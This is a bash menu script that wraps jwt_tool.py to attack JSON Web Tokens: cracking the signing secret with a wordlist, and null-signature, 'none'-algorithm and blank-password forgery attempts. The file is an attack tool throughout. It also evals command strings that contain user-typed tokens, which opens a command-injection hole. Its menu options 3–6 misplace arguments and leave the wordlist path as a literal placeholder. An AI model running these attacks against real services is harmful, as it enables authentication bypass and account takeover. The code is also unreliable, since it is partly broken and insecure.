#!/bin/bash

# Function to display the ASCII art banner
display_banner() {
    local banner="\
    ░░░░░██╗░██╗░░░░░░░██╗████████╗███╗░░██╗██╗███╗░░██╗░░░░░██╗░█████╗░
    ░░░░░██║░██║░░██╗░░██║╚══██╔══╝████╗░██║██║████╗░██║░░░░░██║██╔══██╗
    ░░░░░██║░╚██╗████╗██╔╝░░░██║░░░██╔██╗██║██║██╔██╗██║░░░░░██║███████║
    ██╗░░██║░░████╔═████║░░░░██║░░░██║╚████║██║██║╚████║██╗░░██║██╔══██║
    ╚█████╔╝░░╚██╔╝░╚██╔╝░░░░██║░░░██║░╚███║██║██║░╚███║╚█████╔╝██║░░██║
    ░╚════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░░╚═╝░░╚══╝╚═╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝"

    echo -e "$banner"
}

JWT_TOKEN="$1"

# Function to execute a command with a time delay and capture the output
execute_command() {
    local cmd="$1"
    local delay="$2"
    local attack_name="$3"

    output=$(eval "$cmd" 2>&1)
    echo "Attack: $attack_name"
    echo "Output:"
    echo "$output"
    echo "---------------------------------------------"
    sleep "$delay"
}

# Execute each command with a time delay and capture the output
execute_all_commands() {
    execute_command "python jwt_tool.py \"$JWT_TOKEN\"" 2 "jwt details"
    execute_command "python jwt_tool.py \"$JWT_TOKEN\" -C -d {path}" 5 "crack the token password"
    execute_command "python jwt_tool.py \"$JWT_TOKEN\" -X n" 1 "null signature attack"
    execute_command "python jwt_tool.py \"$JWT_TOKEN\" -X a" 1 "none attack"
    execute_command "python jwt_tool.py \"$JWT_TOKEN\" -X b" 1 "blank password attack"
}

# Function to display the menu
show_menu() {
    clear
    display_banner
    echo "JWT Token Tool"
    echo "1. Execute All Actions"
    echo "2. JWT Details"
    echo "3. Crack Token Password"
    echo "4. Null Signature Attack"
    echo "5. None Attack"
    echo "6. Blank Password Attack"
    echo "7. Exit"
}

# Main loop
while true; do
    show_menu

    read -r -p "Enter your choice: " choice

    case $choice in
        1)
            if [ -z "$JWT_TOKEN" ]; then
                echo "JWT token is missing. Please provide it as a command-line argument."
                read -n 1 -s -r -p "Press any key to continue..."
            else
                execute_all_commands
            fi
            ;;
        2)
            read -p "Enter JWT Token: " JWT_TOKEN
            execute_command "python jwt_tool.py \"$JWT_TOKEN\"" 2 "JWT Details"
            ;;
        3)
            read -p "Enter JWT Token: " JWT_TOKEN
            execute_command "python jwt_tool.py \"$JWT_TOKEN\" -C -d {path}" "Crack Token Password"
            ;;
        4)
            read -p "Enter JWT Token: " JWT_TOKEN
            execute_command "python jwt_tool.py \"$JWT_TOKEN\" -X n" "Null Signature Attack"
            ;;
        5)
            read -p "Enter JWT Token: " JWT_TOKEN
            execute_command "python jwt_tool.py \"$JWT_TOKEN\" -X a" "None Attack"
            ;;
        6)
            read -p "Enter JWT Token: " JWT_TOKEN
            execute_command "python jwt_tool.py \"$JWT_TOKEN\" -X b" "Blank Password Attack"
            ;;
        7)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid choice. Please try again."
            ;;
    esac
done
